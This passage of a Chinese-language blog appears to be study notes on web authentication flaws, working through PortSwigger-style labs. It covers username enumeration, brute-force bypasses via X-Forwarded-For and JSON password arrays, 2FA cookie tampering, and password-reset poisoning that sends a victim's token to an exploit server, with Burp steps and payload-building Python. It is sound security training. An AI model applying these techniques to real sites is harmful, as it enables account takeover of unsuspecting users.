<li>可识别的模式：例如电子邮件地址。例如，我们经常看到企业登录名采用<a href="mailto:&#x66;&#105;&#x72;&#115;&#116;&#110;&#97;&#x6d;&#x65;&#x2e;&#x6c;&#x61;&#115;&#x74;&#110;&#97;&#109;&#101;&#x40;&#115;&#x6f;&#109;&#101;&#x63;&#x6f;&#x6d;&#x70;&#97;&#x6e;&#x79;&#x2e;&#99;&#111;&#109;">&#x66;&#105;&#x72;&#115;&#116;&#110;&#97;&#x6d;&#x65;&#x2e;&#x6c;&#x61;&#115;&#x74;&#110;&#97;&#109;&#101;&#x40;&#115;&#x6f;&#109;&#101;&#x63;&#x6f;&#x6d;&#x70;&#97;&#x6e;&#x79;&#x2e;&#99;&#111;&#109;</a>的格式。</li>
<li>可预测的用户名：即使没有明显的模式，有时甚至会使用可预测的用户名（例如admin或administrator）来创建高权限账户。</li>
<li>收集资料：能否在未登录的情况下访问用户个人资料？即使个人资料的实际内容被隐藏，个人资料中使用的名称有时也与登录用户名相同。您还应该检查HTTP响应，看看是否公开了任何电子邮件地址。有时，响应中会包含高级特权用户（例如管理员或IT支持人员）的电子邮件地址。</li>
</ol>
<h3 id="2-1-2-passwords"><a href="#2-1-2-passwords" class="headerlink" title="2.1.2 passwords"></a>2.1.2 passwords</h3><p>利用&#x3D;&#x3D;对人类行为的基本了解&#x3D;&#x3D;来利用用户无意中引入到这个系统中的漏洞。用户通常不会使用随机字符组合来创建强密码，而是会尝试使用他们可以记住的密码，并试图将其塞入符合密码策略的密码。例如，如果不允许使用mypassword，用户可能会尝试使用Mypassword1!</p>
<h3 id="2-1-3-Username-enumeration"><a href="#2-1-3-Username-enumeration" class="headerlink" title="2.1.3 Username enumeration"></a>2.1.3 Username enumeration</h3><p>用户名枚举是指攻击者能够观察网站行为的变化，以便确定给定的用户名是否有效。</p>
<p>用户名枚举通常发生在登录页面，例如，当您输入有效的用户名但密码错误时，或者在注册表单上输入已存在的用户名时。这大大减少了暴力破解登录所需的时间和精力，因为攻击者能够快速生成一个有效用户名的简短列表。</p>
<p>在尝试对登录页面进行暴力破解时，您应该特别注意以下任何差异：</p>
<ol>
<li>状态码 ：在暴力破解攻击期间，返回的HTTP状态码对于绝大多数猜测可能是相同的，因为它们中的大多数都是错误的。如果某个猜测返回的状态码不同，这强烈表明用户名是正确的。对于网站来说，无论结果如何，始终返回相同的状态码是最佳实践，但这种做法并不总是被遵循。</li>
<li>错误消息：有时，返回的错误消息会根据用户名和密码都是否正确或只有密码不正确而有所不同。在两种情况下都使用相同的通用消息是最佳实践，但有时会出现小的打字错误。即使只有一个字符的位置不对，也会使两条消息有所不同，即使在呈现的页面上看不到该字符。</li>
<li>响应时间：如果大多数请求的处理响应时间都相似，那么任何与此不同的请求都表明幕后可能发生了不同的事情。这也表明猜测的用户名可能是正确的。例如，网站可能只有在用户名有效的情况下才会检查密码是否正确。这额外的步骤可能会导致响应时间略有增加。这可能是微妙的，但攻击者可以通过输入一个过长的密码来使这种延迟更加明显，网站处理这个过长的密码需要明显更长的时间。</li>
</ol>
<p><img src="/images/image-20260111213249-e1e5qtj.png" alt="image"></p>
<h2 id="2-2-Flawed-brute-force-protection"><a href="#2-2-Flawed-brute-force-protection" class="headerlink" title="2.2 Flawed brute-force protection"></a>2.2 Flawed brute-force protection</h2><p>从逻辑上讲，暴力保护的核心是尽可能地使自动化过程变得困难，并减缓攻击者尝试登录的速度。防止暴力攻击的两种最常见的方法是:</p>
<ol>
<li>如果远程用户多次尝试失败，锁定他们试图访问的账户。</li>
<li>如果远程用户在短时间内多次尝试登录，阻止他们的IP地址。</li>
</ol>
<p>这两种方法都提供了不同程度的保护，但都没有固若金汤，尤其是如果实现逻辑有缺陷的话。例如，如果你多次登录失败，有时可能会发现你的IP被屏蔽了。在某些实现中，如果IP所有者成功登录，失败尝试的次数计数器会重置。这意味着攻击者只需要每隔几次尝试就登录到他们自己的账户，就可以防止达到这个限制。在这种情况下，只需在字典中的每个间隔包含您自己的登录凭据，就足以使这种防御变得几乎毫无用处。</p>
<p>账户锁定无法防止凭证填充攻击。这种攻击方式涉及使用一个由用户名:密码对组成的巨大字典，这些字典由数据泄露中窃取的真实登录凭证组成。凭证填充依赖于一个事实，即许多人在多个网站上重复使用相同的用户名和密码，因此，字典中一些受损的凭证也有可能在目标网站上有效。账户锁定无法防止凭证填充，因为每个用户名只被尝试一次。凭证填充尤其危险，因为它有时会导致攻击者只需一次自动攻击就可以破坏许多不同的账户。</p>
<h3 id="2-2-1-User-rate-limiting"><a href="#2-2-1-User-rate-limiting" class="headerlink" title="2.2.1 User rate limiting"></a>2.2.1 User rate limiting</h3><p>网站防止暴力攻击的另一种方法是限制用户速率。在这种情况下，在短时间内发出太多登录请求会导致您的 IP 地址被屏蔽。通常，IP 只能通过以下一种方式解除屏蔽：</p>
<ol>
<li>在一段时间后自动解除屏蔽</li>
<li>由管理员手动解除屏蔽</li>
<li>用户在成功完成验证码后手动解除屏蔽</li>
</ol>
<p>与账户锁定相比，有时更倾向于使用用户速率限制，因为它不太容易受到用户名枚举和拒绝服务攻击。</p>
<p>由于限制是基于从用户 IP 地址发送的 HTTP 请求的速率，因此，如果您能想出如何通过一个请求猜测多个密码，有时也可以绕过此防御。</p>
<ol>
<li><p>运行Burp后，检查登录页面。注意，POST &#x2F;login请求以JSON格式提交登录凭据。将此请求发送到Burp Repeater中，将密码的单个字符串值替换为包含所有候选密码的字符串数组。例如：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">file_path=<span class="string">r&quot;C:\Users\xxxxxxxx\Desktop\password.txt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[&quot;</span>,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(file_path,<span class="string">&quot;r&quot;</span>,encoding=<span class="string">&quot;utf-8&quot;</span>)<span class="keyword">as</span> infile:</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> infile:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;&quot;&#x27;</span>+line.rstrip(<span class="string">&quot;\n&quot;</span>)+<span class="string">&#x27;&quot;,&#x27;</span>,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">infile.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\&quot;2\&quot;]&quot;</span>,end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure></li>
</ol>
<p><img src="/images/image-20251115175218-6pnqf55.png" alt="image"></p>
<ol start="2">
<li><p>发送请求。这将返回一个302响应。</p>
<p><img src="/images/image-20251115182124-othyg0y.png" alt="image"></p>
</li>
<li><p>右键单击此请求并选择在浏览器中显示响应。复制URL并将其加载到浏览器中。页面加载，您以carlos的身份登录。拿到session.</p>
</li>
</ol>
<h2 id="2-3-HTTP-basic-authentication"><a href="#2-3-HTTP-basic-authentication" class="headerlink" title="2.3 HTTP basic authentication"></a>2.3 HTTP basic authentication</h2><p>尽管HTTP基本认证（HTTP basic authentication）相对简单且易于实现，但它的安全性并不高，因此现在已不常用。在进行HTTP基本认证时，客户端会从服务器接收一个认证令牌（authentication token），该令牌是通过将用户名和密码连接起来，然后使用Base64编码生成的。这个令牌由浏览器存储和管理，浏览器会自动将其添加到后续每个请求的Authorization头部中，格式如下：Authorization: Basic base64(username:password)</p>
<p>以下是HTTP基本认证被认为不安全的原因：</p>
<p>它需要在每次请求时反复发送用户的登录凭证（login credentials）。除非网站同时也实现了HSTS（HTTP Strict Transport Security），否则用户的凭证很容易在中间人攻击（man-in-the-middle attack）中被截获。<br>HTTP基本认证的实现通常不支持抵御暴力攻击（brute-force protection）。由于令牌完全由静态值组成，因此很容易受到暴力攻击。<br>HTTP基本认证特别容易受到与会话相关的攻击（session-related exploits），尤其是CSRF（跨站请求伪造，Cross-site request forgery），而它本身并不能提供针对CSRF的保护。</p>
<p>在某些情况下，利用脆弱的HTTP基本认证可能只会让攻击者访问到一个看起来无关紧要的页面。但是，除了提供一个额外的攻击面之外，以这种方式暴露的凭证可能会在其他更机密的上下文中被重用。</p>
<h1 id="3-Vulnerabilities-in-multi-factor-authentication"><a href="#3-Vulnerabilities-in-multi-factor-authentication" class="headerlink" title="3. Vulnerabilities in multi-factor authentication"></a>3. Vulnerabilities in multi-factor authentication</h1><p>许多网站仅依赖使用密码的单因素认证来验证用户。然而，有些网站要求用户通过多个认证因素来证明自己的身份。对于大多数网站来说，验证生物识别因素是不现实的。但是，越来越多地看到基于您所知道的内容和您所拥有的内容的强制性和可选性的两因素认证（2FA）。这通常要求用户输入传统的密码和他们拥有的带外物理设备上的临时验证码。</p>
<p><img src="/images/image-20251115184721-kkvcgbj.png" alt="image"></p>
<p>虽然攻击者有时可能会获得一个基于知识的单一因素，例如密码，但同时从带外源获得另一个因素要困难得多。因此，两因素认证比单因素认证更安全。</p>
<p>实施不当的两因素认证可能会被击败，甚至完全绕过，就像单因素认证一样。值得注意的是，只有通过验证多个不同的因素，才能完全实现多因素认证的好处。</p>
<p>以两种不同的方式验证相同的因素并不是真正的两因素认证。基于电子邮件的2FA就是这样一个例子。虽然用户必须提供密码和验证码，但访问验证码仅依赖于他们知道自己的电子邮件账户的登录凭据。因此，知识认证因素只是被验证了两次。</p>
<p>2FA 的「安全增量」来自「不同类型因素的互补」，而非「同一因素的重复验证」。电子邮件 2FA 的两次验证（密码 + 邮箱验证码），本质都是验证「用户知道什么」，没有引入「持有物」或「生物特征」等独立因素，因此不算真正的 2FA—— 它只是「加强版的单因素认证」，而非符合标准的双因素认证。</p>
<h2 id="3-1-2FA-simple-bypass"><a href="#3-1-2FA-simple-bypass" class="headerlink" title="3.1 2FA simple bypass"></a>3.1 2FA simple bypass</h2><p>有时，二次认证的实施存在缺陷，以至于可以被完全绕过。如果用户首先被提示输入密码，然后在另一个页面上被提示输入验证码，那么用户在输入验证码之前实际上已经处于“登录”状态。在这种情况下，值得测试一下在完成第一步认证后，你是否可以直接跳转到“仅登录”页面。有时，你会发现网站在实际加载页面之前，并没有检查你是否完成了第二步认证。</p>
<p>‍</p>
<h2 id="3-2-Flawed-two-factor-verification-logic"><a href="#3-2-Flawed-two-factor-verification-logic" class="headerlink" title="3.2 Flawed two-factor verification logic"></a>3.2 Flawed two-factor verification logic</h2><p>有时，双因素身份验证中的&#x3D;&#x3D;逻辑缺陷&#x3D;&#x3D;意味着，在用户完成了初始登录步骤后，网站没有充分验证同一用户是否正在完成第二步。例如，用户在第一步中使用其正常凭据登录，如下所示：</p>
<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /login-steps/first HTTP/1.1</span><br><span class="line">Host: vulnerable-website.com</span><br><span class="line">...</span><br><span class="line">username=carlos&amp;password=qwerty</span><br></pre></td></tr></table></figure>

<p>然后，在进入登录过程的第二步之前，他们会被分配一个与他们的帐户相关的cookie：</p>
<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Set-Cookie: account=carlos</span><br><span class="line"></span><br><span class="line">GET /login-steps/second HTTP/1.1</span><br><span class="line">Cookie: account=carlos</span><br></pre></td></tr></table></figure>

<p>当提交验证码时，请求使用这个cookie来确定用户正在尝试访问哪个帐户：</p>
<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">POST /login-steps/second HTTP/1.1</span><br><span class="line">Host: vulnerable-website.com</span><br><span class="line">Cookie: account=carlos</span><br><span class="line">...</span><br><span class="line">verification-code=123456</span><br></pre></td></tr></table></figure>

<p>在这种情况下，攻击者可以使用自己的凭据登录，但在提交验证码时将帐户cookie的值更改为任意用户名。</p>
<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">POST /login-steps/second HTTP/1.1</span><br><span class="line">Host: vulnerable-website.com</span><br><span class="line">Cookie: account=victim-user</span><br><span class="line">...</span><br><span class="line">verification-code=123456</span><br></pre></td></tr></table></figure>

<p>&#x3D;&#x3D;如果攻击者能够暴力破解验证码，这将是极其危险的，因为这将允许他们完全基于用户名登录任意用户的帐户。他们甚至不需要知道用户的密码。&#x3D;&#x3D;</p>
<p>‍</p>
<p>在运行 Burp 的情况下，登录您自己的账户并检查 2FA 验证过程。请注意，在 POST &#x2F;login2 请求中，verify 参数用于确定正在访问哪个用户的账户。<br>注销您的账户。<br>将 GET &#x2F;login2 请求发送到 Burp Repeater。将 verify 参数的值更改为 carlos 并发送请求。这将确保为 Carlos 生成一个临时的 2FA 代码。</p>
<p><img src="/images/image-20251115193608-lybbuiv.png" alt="image"><br>转到登录页面并输入您的用户名和密码。然后，提交一个无效的 2FA 代码。<br>将 POST &#x2F;login2 请求发送到 Burp Intruder。<br>在 Burp Intruder 中，将 verify 参数设置为 carlos 并向 mfa-code 参数添加一个有效负载位置。对验证码进行暴力破解。<br>在浏览器中加载 302 响应。</p>
<p><img src="/images/image-20251115193928-58dtuou.png" alt="image"></p>
<p>要模拟正常用户的行为，有些要素是需要有行为模拟后才会触发的，比如安全的验证码。</p>
<h1 id="4-Vulnerabilities-in-other-authentication-mechanisms"><a href="#4-Vulnerabilities-in-other-authentication-mechanisms" class="headerlink" title="4.Vulnerabilities in other authentication mechanisms"></a>4.Vulnerabilities in other authentication mechanisms</h1><p>除了基本的登录功能之外，大多数网站还提供&#x3D;&#x3D;补充功能&#x3D;&#x3D;，允许用户管理自己的账户。例如，用户通常可以在忘记密码时更改密码或重置密码。这些机制也可能引入攻击者可以利用的漏洞。网站通常会注意避免在其登录页面中出现众所周知的漏洞。但是，人们很容易忽视一点，那就是你需要采取类似的措施来确保相关功能的健壮性。</p>
<p>在攻击者能够创建自己的账户的情况下，这一点尤其重要，因为这样攻击者就可以轻松地访问这些额外的页面。</p>
<h2 id="4-1-Brute-forcing-a-stay-logged-in-cookie"><a href="#4-1-Brute-forcing-a-stay-logged-in-cookie" class="headerlink" title="4.1 Brute-forcing a stay-logged-in cookie"></a>4.1 Brute-forcing a stay-logged-in cookie</h2><p>许多网站在用户登录时提供了一个选项，即在关闭浏览器后仍然保持登录状态。这通常是一个简单的复选框，标记为“记住我”或“保持登录状态”。</p>
<p>此功能通常通过生成某种“remember me”令牌来实现，然后将该令牌存储在持久性 cookie 中。</p>
<p>由于拥有此 cookie 可以有效地让您绕过整个登录过程，因此此 cookie 最好是难以猜测的。</p>
<p>但是，一些网站会根据可预测的静态值组合（例如用户名和时间戳）生成此 cookie。有些甚至使用密码作为 cookie 的一部分。</p>
<p>如果攻击者能够创建自己的账户，这种方法尤其危险，因为他们可以研究自己的 cookie，并可能推断出它是如何生成的。一旦他们弄清楚了公式，他们就可以尝试暴力破解其他用户的 cookie 以访问他们的账户。</p>
<p>一些网站假设，如果 cookie 以某种方式加密，它将不可猜测，即使它确实使用静态值。如果做得正确，这可能是正确的，但是使用简单的双向编码（如 Base64）天真地“加密”cookie 根本不提供任何保护。即使使用带有单向散列函数 的正确加密也不是完全安全的。如果攻击者能够轻松识别散列算法，并且不使用盐，他们就可以通过简单地对单词表进行散列来潜在地对 cookie 进行暴力破解。如果对 cookie 猜测没有类似的限制，则可以使用此方法绕过登录尝试限制。</p>
<p>‍</p>
<p><img src="/images/image-20251116001552-rxy2f0d.png" alt="image"></p>
<p>是base64(username+md5(密码))</p>
<p><img src="/images/image-20251116002141-30623tz.png" alt="image"></p>
<p>在 Burp Intruder 中，请注意 stay-logged-in cookie 已自动添加为有效负载位置。添加您自己的密码作为单个有效负载。<br>在“有效负载处理”下，依次添加以下规则。这些规则将在请求提交之前依次应用于每个有效负载。<br>• 哈希：MD5<br>• 添加前缀：wiener:<br>• 编码：Base64 编码</p>
<h2 id="3-3-Resetting-user-passwords"><a href="#3-3-Resetting-user-passwords" class="headerlink" title="3.3 Resetting user passwords"></a>3.3 Resetting user passwords</h2><p>在实践中，一些用户会忘记他们的密码，所以有一种方法让他们重置密码是很常见的。由于通常的基于密码的身份验证在这种情况下显然是不可能的，网站必须依靠其他方法来确保真正的用户正在重置自己的密码。因此，密码重置功能本质上是危险的，需要安全地实现。这个特性通常有几种不同的实现方式，具有不同程度的漏洞。</p>
<h3 id="3-3-1-Sending-passwords-by-email"><a href="#3-3-1-Sending-passwords-by-email" class="headerlink" title="3.3.1 Sending passwords by email"></a>3.3.1 Sending passwords by email</h3><p>如果一个网站最初就安全地处理密码，那么就不应该向用户发送他们当前的密码。相反，一些网站会生成一个新密码，并通过电子邮件将其发送给用户。一般来说，应避免通过不安全的渠道发送持久性密码。在这种情况下，安全性依赖于生成密码在很短的时间后过期，或者用户立即再次更改密码。否则，这种方法很容易受到中间人攻击。鉴于收件箱是持久的，并且并不是真正为安全存储机密信息而设计的，因此电子邮件通常也不被认为是安全的。许多用户还会在不安全渠道中的多个设备之间自动同步他们的收件箱。</p>
<h3 id="3-3-2-Resetting-passwords-using-a-URL（broken-logic）"><a href="#3-3-2-Resetting-passwords-using-a-URL（broken-logic）" class="headerlink" title="3.3.2 Resetting passwords using a URL（broken logic）"></a>3.3.2 Resetting passwords using a URL（broken logic）</h3><p>一种更健壮的密码重置方法是向用户发送一个唯一的URL，将他们带到密码重置页面。这种方法的安全性较低的实现方式是使用一个容易猜测的参数来标识要重置哪个账户，例如：<a target="_blank" rel="noopener" href="http://vulnerable-website.com/reset-password?user=victim-user">http://vulnerable-website.com/reset-password?user=victim-user</a></p>
<p>在这个例子中，攻击者可以更改user参数，以引用他们已经识别的任何用户名。然后，他们将被直接带到一个页面，在那里他们可以潜在地为这个任意用户设置一个新密码。</p>
<p>这个过程的一个更好的实现方法是生成一个高熵、难以猜测的令牌，并基于该令牌创建重置URL。在最佳情况下，这个URL应该不提供有关哪个用户的密码正在被重置的提示。</p>
<p><a target="_blank" rel="noopener" href="http://vulnerable-website.com/reset-password?token=a0ba0d1cb3b63d13822572fcff1a241895d893f659164d4cc550b421ebdd48a8">http://vulnerable-website.com/reset-password?token=a0ba0d1cb3b63d13822572fcff1a241895d893f659164d4cc550b421ebdd48a8</a></p>
<p>当用户访问这个URL时，系统应该检查这个令牌在后台是否存在，如果存在，应该检查它是用来重置哪个用户的密码的。</p>
<p>这个令牌应该在短时间内过期，并在密码重置后立即销毁。然而，一些网站在重置表单提交时未能再次验证令牌。在这种情况下，攻击者可以简单地访问他们自己账户的重置表单，删除令牌，并利用这个页面来重置任意用户的密码。</p>
<p><img src="/images/image-20251116154147-yc4kat6.png" alt="image"></p>
<p><img src="/images/image-20251116154230-wyfa071.png" alt="image"></p>
<p>输入重置密码的链接后，点击链接跳转</p>
<p><img src="/images/image-20251116154346-b3s08a2.png" alt="image"><img src="/images/image-20251116154641-xfd9bf9.png" alt="image"></p>
<ol>
<li>运行Burp Suite，单击“忘记密码？”链接，并输入您自己的用户名。</li>
<li>单击“电子邮件客户端”按钮，查看已发送的密码重置电子邮件。单击电子邮件中的链接，并将密码重置为您想要的任何密码。</li>
<li>在Burp中，转到“代理”&gt;“HTTP历史记录”，并研究密码重置功能的请求和响应。请注意，重置令牌作为重置电子邮件中的URL查询参数提供。请注意，提交新密码时，POST &#x2F;forgot-password?temp-forgot-password-token请求包含作为隐藏输入的用户名。将此请求发送到Burp Repeater。</li>
<li>在Burp Repeater中，请注意，即使您删除URL和请求正文中temp-forgot-password-token参数的值，密码重置功能仍然有效。这确认了在提交新密码时不会检查令牌。</li>
<li>在浏览器中，再次请求密码重置并再次更改密码。将POST &#x2F;forgot-password?temp-forgot-password-token请求再次发送到Burp Repeater。</li>
<li>在Burp Repeater中，删除URL和请求正文中temp-forgot-password-token参数的值。将username参数更改为carlos。将新密码设置为所需的任何密码，然后发送请求。</li>
<li>在浏览器中，使用您刚刚设置的新密码登录Carlos的帐户。单击“我的帐户”以解决实验室问题。</li>
</ol>
<p><img src="/images/image-20251116155906-4rjz1yx.png" alt="image"></p>
<p>‍</p>
<h3 id="3-3-3-Lab-Password-reset-poisoning-via-middleware"><a href="#3-3-3-Lab-Password-reset-poisoning-via-middleware" class="headerlink" title="3.3.3 Lab: Password reset poisoning via middleware"></a>3.3.3 Lab: Password reset poisoning via middleware</h3><p>这个实验室很容易受到密码重置中毒的影响。用户carlos会不小心点击他收到的电子邮件中的任何链接。要解决实验室的问题，登录卡洛斯的账户。</p>
<p>您可以使用以下凭据登录自己的帐户：wiener:peter。发送到该帐户的任何电子邮件都可以通过漏洞利用服务器上的电子邮件客户端读取。</p>
<p>‍</p>
<ol>
<li>在运行Burp的情况下，研究密码重置功能。可以看到，一封包含唯一重置令牌的链接通过电子邮件发送。</li>
<li>将POST &#x2F;forgot-password请求发送到Burp Repeater。注意，X-Forwarded-Host头是受支持的，您可以使用它将动态生成的重置链接指向任意域。</li>
<li>转到攻击服务器并记下您的攻击服务器URL。</li>
<li>返回到Burp Repeater中的请求，并使用您的攻击服务器URL添加X-Forwarded-Host头(&#x3D;&#x3D;纯域名&#x3D;&#x3D;)：X-Forwarded-Host: exploit-0a040027049c72d7801b48f2018f000b.exploit-server.net&#x2F;exploit</li>
<li>将username参数更改为carlos并发送请求。</li>
</ol>
<p><img src="/images/image-20251116162000-yd018ep.png" alt="image"><br>转到攻击服务器并打开访问日志。您应该看到一个包含受害者的令牌作为查询参数的GET &#x2F;forgot-password请求。记下此令牌。<br>返回到您的电子邮件客户端并复制有效的密码重置链接（不是指向攻击服务器的链接）。将此粘贴到浏览器中，并将temp-forgot-password-token参数的值更改为您从受害者那里窃取的值。</p>
<p><img src="/images/image-20251116162205-lvi35wl.png" alt="image"><br>加载此URL并为Carlos的帐户设置一个新密码。<br>使用新密码登录Carlos的帐户以解决实验室问题。</p>
<p>因为攻击者的username设置为了受害者，所以邮件会被发到受害者的邮箱里面，网站使用了 <code>X-Forwarded-Host</code>​ 头中的恶意域名来作为链接的基准，它的主要作用是在请求通过一个或多个<strong>代理服务器</strong>（如负载均衡器、反向代理或CDN）到达最终的后端应用服务器时，告知后端应用<strong>原始客户端请求中使用的</strong> <strong>​<code>Host</code>​</strong>​ <strong>域名</strong>。</p>
<h2 id="3-4-Changing-user-passwords"><a href="#3-4-Changing-user-passwords" class="headerlink" title="3.4 Changing user passwords"></a>3.4 Changing user passwords</h2><p>通常，更改密码需要输入当前密码，然后两次输入新密码。这些页面基本上依赖于与普通登录页面相同的流程来检查用户名和当前密码是否匹配。因此，这些页面可能会受到相同技术的攻击。如果密码更改功能允许攻击者直接在未以受害者用户身份登录的情况下访问它，那么它可能会特别危险。例如，如果用户名是在隐藏字段中提供的，攻击者可能会在请求中编辑此值以针对任意用户。这可能会被利用来枚举用户名和暴力破解密码。</p>
<h3 id="3-4-1-Lab-Password-brute-force-via-password-change"><a href="#3-4-1-Lab-Password-brute-force-via-password-change" class="headerlink" title="3.4.1 Lab: Password brute-force via password change"></a>3.4.1 Lab: Password brute-force via password change</h3><p>这个实验室的密码修改功能很容易受到暴力攻击。要破解实验室，使用候选密码列表来破解卡洛斯的账户，并进入他的“我的账户”页面。</p>
<ul>
<li>Your credentials: <code>wiener:peter</code></li>
<li>Victim’s username: <code>carlos</code></li>
</ul>
<p>&#x3D;&#x3D;（并不是冲着改密码去的有referer头，重放不了，是去爆破密码的，因为可以基于错误判断）&#x3D;&#x3D;</p>
<ul>
<li><img src="/images/image-20251116165748-msmsk3b.png" alt="image"></li>
</ul>
<p><img src="/images/image-20251116165726-u1ybcds.png" alt="image"></p>
<h1 id="5-LAB"><a href="#5-LAB" class="headerlink" title="5.LAB:"></a>5.LAB:</h1><h2 id="Lab-Username-enumeration-via-response-timing"><a href="#Lab-Username-enumeration-via-response-timing" class="headerlink" title="Lab: Username enumeration via response timing"></a>Lab: Username enumeration via response timing</h2><p>直接爆破会被封IP——确定“X-Forwarded-For”头是受支持的，这使您可以欺骗您的IP地址，并绕过基于IP的暴力保护。</p>
<p><img src="/images/image-20251115125349-l268pwu.png" alt="image"></p>
<ol>
<li><p>尝试用户名和密码。特别要注意响应时间。请注意，当用户名无效时，响应时间大致相同。然而，当您输入有效的用户名（您自己的用户名）时，响应时间会根据您输入的长度而增加。</p>
</li>
<li><p>将此请求发送到Burp Intruder，并从攻击类型下拉菜单中选择“Pitchfork”攻击。添加“X-Forwarded-For”头。</p>
</li>
<li><p>为“X-Forwarded-For”头和用户名参数添加有效负载位置。将密码设置为一个非常长的字符字符串（大约100个字符应该可以）。</p>
</li>
<li><p>在“有效负载”侧边栏中，从“有效负载位置”下拉列表中选择位置1。选择“数字”有效负载类型。输入1-100的范围，并将步进设置为1。将最大小数位数设置为0。这将用于欺骗您的IP。</p>
</li>
<li><p>从“有效负载位置”下拉列表中选择位置2，然后添加用户名列表。开始攻击。</p>
</li>
<li><p>攻击完成后，在对话框的顶部，单击“列”，然后选择“接收到的响应”和“完成的响应”选项。这两列现在显示在结果表中。</p>
</li>
<li><p>请注意，其中一个响应时间明显比其他响应时间长。重复此请求几次，以确保它始终需要更长时间，然后记下此用户名。</p>
</li>
<li><p>为同一请求创建一个新的Burp Intruder攻击。再次添加“X-Forwarded-For”头，并为它添加一个有效负载位置。插入您刚刚确定的用户名，并为密码参数添加一个有效负载位置。</p>
</li>
<li><p>在“有效负载”侧边栏中，将数字列表添加到有效负载位置1，将密码列表添加到有效负载位置2。开始攻击。</p>
</li>
<li><p>攻击完成后，找到具有302状态的响应。记下此密码。</p>
</li>
<li><p>使用您确定的用户名和密码登录，访问用户帐户页面以解决实验室问题。</p>
</li>
</ol>
<p><img src="/images/image-20251115132119-fpvrynr.png" alt="image"></p>
<h2 id="Lab-Broken-brute-force-protection-IP-block-锁定模式存在问题"><a href="#Lab-Broken-brute-force-protection-IP-block-锁定模式存在问题" class="headerlink" title="Lab: Broken brute-force protection, IP block(锁定模式存在问题)"></a>Lab: Broken brute-force protection, IP block(锁定模式存在问题)</h2><p>可以尝试自己写一个脚本</p>
<p>‍</p>
<p>这个实验室由于其密码暴力保护中的一个逻辑缺陷而容易受到攻击。要解决这个实验室的问题，需要对受害者的密码进行暴力破解，然后登录并访问他们的账户页面。</p>
<p> • 您的凭证：wiener:peter</p>
<p>• 受害者的用户名：carlos • 候选密码</p>
<p>‍</p>
<ol>
<li>在运行 Burp 的情况下，检查登录页面。注意，如果您连续提交 3 次错误的登录信息，您的 IP 地址将被暂时封锁。但是，请注意，在达到此限制之前，您可以通过登录自己的账户来重置失败登录尝试的次数。</li>
<li>输入无效的用户名和密码，然后将 POST &#x2F;login 请求发送到 Burp Intruder。创建一个在用户名和密码参数中都有有效负载位置的 pitchfork 攻击。</li>
<li>单击“Resource pool”以打开“Resource pool”侧边栏，然后将攻击添加到“Maximum concurrent requests”设置为 1 的资源池中。通过一次只发送一个请求，您可以确保您的登录尝试按正确的顺序发送到服务器。</li>
<li>单击“Payloads”以打开“Payloads”侧边栏，然后从“Payload position”下拉列表中选择位置 1。添加一个在您的用户名和 carlos 之间交替的有效负载列表。确保您的用户名排在第一位，并且 carlos 至少重复 100 次。</li>
<li>编辑候选密码列表，并在每个密码之前添加您自己的密码。确保您的密码与另一个列表中的用户名对齐。<br>从“Payload position”下拉列表中选择位置 2，然后添加密码列表。开始攻击。</li>
<li>攻击完成后，过滤结果以隐藏状态码为 200 的响应。按用户名对剩余结果进行排序。应该只有一个用户名为 carlos 的请求的 302 响应。从“Payload 2”列中记下密码。</li>
<li>使用您确定的密码登录 Carlos 的账户，访问他的账户页面以解决实验室问题。</li>
</ol>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">payload_username=[]</span><br><span class="line">file=<span class="built_in">open</span>(<span class="string">&quot;username.txt&quot;</span>,<span class="string">&quot;a&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">101</span>):</span><br><span class="line">    file.write(<span class="string">&quot;carlos\nwiener\n&quot;</span>)    </span><br><span class="line"></span><br><span class="line">file.close()</span><br></pre></td></tr></table></figure>

<p><img src="/images/image-20251115171506-5svg0ou.png" alt="image"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">file_path=<span class="string">r&quot;C:\Users\xxxxxxx\Desktop\password.txt&quot;</span></span><br><span class="line">output_file=<span class="string">r&quot;C:\Users\xxxxxxx\Desktop\new_password.txt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(file_path,<span class="string">&quot;r&quot;</span>,encoding=<span class="string">&quot;utf-8&quot;</span>)<span class="keyword">as</span> infile,<span 